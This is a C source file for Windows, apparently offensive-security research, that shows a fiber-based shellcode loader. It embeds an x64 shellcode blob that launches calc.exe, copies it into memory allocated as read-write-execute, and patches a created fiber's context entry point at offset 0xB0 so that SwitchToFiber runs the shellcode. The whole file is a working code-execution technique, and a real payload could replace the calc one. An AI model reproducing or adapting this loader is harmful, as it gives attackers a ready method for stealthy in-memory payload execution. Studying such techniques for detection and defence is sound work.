// alfarom256
#include <Windows.h>
#include <stdio.h>

void dummy() {
	puts("Hello Fiber from Dummy");
}

// calc shellcode
unsigned char op[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";


//https://github.com/reactos/reactos/blob/2e1aeb12dfd8b44b4b57d377b59ef347dfe3386e/dll/win32/kernel32/client/fiber.c
//https://doxygen.reactos.org/dd/d83/ndk_2ketypes_8h_source.html#l00179


// s/o to ch3rn0byl and s4r1n
// am I doing s00p3r c001 1337 gr33tz right?
int main() {


	/*
		_TEB.SameTebFlags = _TEB + 0x17ee
		dt _TEB:
		<truncated>
		+0x17ee SameTebFlags     : Uint2B
		+0x17ee SafeThunkCall    : Pos 0, 1 Bit
		+0x17ee InDebugPrint     : Pos 1, 1 Bit
		+0x17ee HasFiberData     : Pos 2, 1 Bit
		+0x17ee SkipThreadAttach : Pos 3, 1 Bit
		+0x17ee WerInShipAssertCode : Pos 4, 1 Bit
		+0x17ee RanProcessInit   : Pos 5, 1 Bit
		+0x17ee ClonedThread     : Pos 6, 1 Bit
		+0x17ee SuppressDebugMsg : Pos 7, 1 Bit
		+0x17ee DisableUserStackWalk : Pos 8, 1 Bit
		+0x17ee RtlExceptionAttached : Pos 9, 1 Bit
		+0x17ee InitialThread    : Pos 10, 1 Bit
		+0x17ee SessionAware     : Pos 11, 1 Bit
		+0x17ee LoadOwner        : Pos 12, 1 Bit
		+0x17ee LoaderWorker     : Pos 13, 1 Bit
		+0x17ee SkipLoaderInit   : Pos 14, 1 Bit
		<truncated>
	*/

	//_TEB* teb = NtCurrentTeb();
	//NT_TIB* tib = (NT_TIB*)teb;
	//void* pTebFlags = (void*)((uintptr_t)teb + 0x17ee);
	//char tebFlags = *(char*)pTebFlags; // it's actually a WORD but I don't care about the second byte
	//
	//BOOL hasFibData = (tebFlags >> 2) & 0b1; // False here, as the current thread is not yet a fiber
	//
	//printf("TebFlag => 0x%x\n", tebFlags);
	//printf("Has Fiber Data : %s\n", (hasFibData ? "true" : "false"));
	//printf("Fiber Data Ptr: %p\n", tib->FiberData);

	//https://github.com/reactos/reactos/blob/2e1aeb12dfd8b44b4b57d377b59ef347dfe3386e/dll/win32/kernel32/client/fiber.c#L256
	ConvertThreadToFiber(NULL);


	//tebFlags = *(char*)pTebFlags;
	//hasFibData = (tebFlags >> 2) & 0b1; // True here after call to ConvertThreadToFiber
	//
	//printf("TebFlag => 0x%x\n", tebFlags);
	//printf("Has Fiber Data : %s\n", (hasFibData ? "true" : "false"));
	//printf("Fiber Data Ptr: %p\n", tib->FiberData);
	//

	/*
		Important to note that tib->FiberData == __readgsqword(0x20)
	*/

	LPVOID lpFiber = CreateFiber(0x100, (LPFIBER_START_ROUTINE)dummy, NULL);
	LPVOID addr = VirtualAlloc(NULL, sizeof(op), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(addr, op, sizeof(op));
	if (lpFiber == NULL) {
		printf("GLE : %d", GetLastError());
		exit(0);
	}

	/*

		Here we are changing the Fiber Context such that the Created Fiber's entry point
		(lpFiber + 0xb0)
		Now points to the newly allocated Shellcode.

		The fiber context resides at the created buffer returned by CreateFiber

	*/
	uintptr_t* tgtFuncAddr = (uintptr_t*)((uintptr_t)lpFiber + 0xB0);
	*tgtFuncAddr = (uintptr_t)addr;

	SwitchToFiber(lpFiber);
}